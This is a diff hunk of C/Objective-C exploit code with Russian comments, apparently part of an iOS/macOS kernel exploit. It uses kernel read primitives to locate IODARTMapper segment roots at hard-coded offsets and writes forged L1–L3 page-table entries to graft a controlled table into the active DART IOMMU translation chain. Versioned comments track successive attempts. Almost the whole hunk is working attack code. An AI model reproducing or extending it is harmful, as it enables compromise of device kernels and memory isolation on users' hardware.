@@ -7797,22 +7797,29 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 *(uint64_t *)(L1p + (uint64_t)ig[1] * 8) = (L2PA >> 4) | 1;
                 *(uint64_t *)(L2p + (uint64_t)ig[2] * 8) = (L3PA >> 4) | 1;
                 *(uint64_t *)(L3p + (uint64_t)ig[3] * 8) = ctl2PA | linkFlags;
-                // 1.9.215: выбор сегмента — АКТИВНАЯ цепь (L0[0]≠0): DVA опа
-                // обслуживается ей (1.9.214: вся наша ветка цела, ctl2=0 — мы
-                // прививались в пустую неактивную, железо её не ходит). Оригинал
-                // сохраняем, restore после окна. Fallback — пустая.
+                // 1.9.216: НАСТОЯЩИЕ корни — [mapper+0x170+i*8] (р.50: IODARTMapper
+                // держит per-seg структуры; +0x00 L0 embedded, +0x14 flags,
+                // bounds +0x18/+0x20/+0x28). Объекты [dartObj+0xcd0] — доменные
+                // дескрипторы (обе L0[0]=0, bounds 0 — не корни, 1.9.215 мимо).
+                // Приоритет: seg с bounds ∋ DVA; потом активная (q0-link валиден);
+                // потом dartObj-fallback как раньше.
                 uint64_t segVA = 0, segOrig = 0;
-                for (uint32_t i = 0; i < 8; i++) {
-                    uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                for (uint32_t i = 0; i < 16; i++) {
+                    uint64_t s = kpLooksLikeKernelPointer(mapVA) ? kp_untag_ptr(early_kread64(mapVA + 0x170 + (uint64_t)i * 8)) : 0;
                     if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
-                    uint64_t e0 = early_kread64(s + (uint64_t)ig[0] * 8);
-                    uint64_t bLo = early_kread64(s + 0x20), bHi = early_kread64(s + 0x28);
-                    kpNote(r, [NSString stringWithFormat:@"  [P7] seg[%u]=%#llx L0[%u]=%#018llx bounds [%#llx..%#llx)",
-                              i, (unsigned long long)s, ig[0], (unsigned long long)e0,
-                              (unsigned long long)bLo, (unsigned long long)bHi]);
-                    if (!segVA && e0 && ((e0 << 4) & 0x0000FFFFFFFFC000ULL)) { segVA = s; segOrig = e0; }
+                    uint64_t q0 = early_kread64(s + 0x00);
+                    uint64_t f14 = early_kread64(s + 0x14);
+                    uint64_t b18 = early_kread64(s + 0x18), b20 = early_kread64(s + 0x20), b28 = early_kread64(s + 0x28);
+                    uint64_t spa = kvtophys(s);
+                    BOOL inB = (dvaG >= b20 && dvaG < b28) || (dvaG >= b18 && dvaG < b20 && b20 > b18);
+                    kpNote(r, [NSString stringWithFormat:@"  [P7] mseg[%u]=%#llx PA=%#llx q0=%#018llx f14=%#x b18=%#llx b20=%#llx b28=%#llx%@",
+                              i, (unsigned long long)s, (unsigned long long)spa, (unsigned long long)q0, (uint32_t)f14,
+                              (unsigned long long)b18, (unsigned long long)b20, (unsigned long long)b28, inB ? @" ← DVA В BOUNDS" : @""]);
+                    if (!segVA && inB) { segVA = s; segOrig = q0; }
+                    else if (!segVA && q0 && ((q0 << 4) & 0x0000FFFFFFFFC000ULL) &&
+                             spa >= 0x10000000000ULL && spa < 0x10100000000ULL) { segVA = s; segOrig = q0; }
                 }
-                if (!segVA) {   // fallback: пустая (как 1.9.213/214)
+                if (!segVA) {   // fallback: dartObj-структуры (как 1.9.213/214/215)
                     for (uint32_t i = 0; i < 8 && !segVA; i++) {
                         uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
                         if (!kpLooksLikeKernelPointer(s) || !kpSafeToRead(s)) continue;
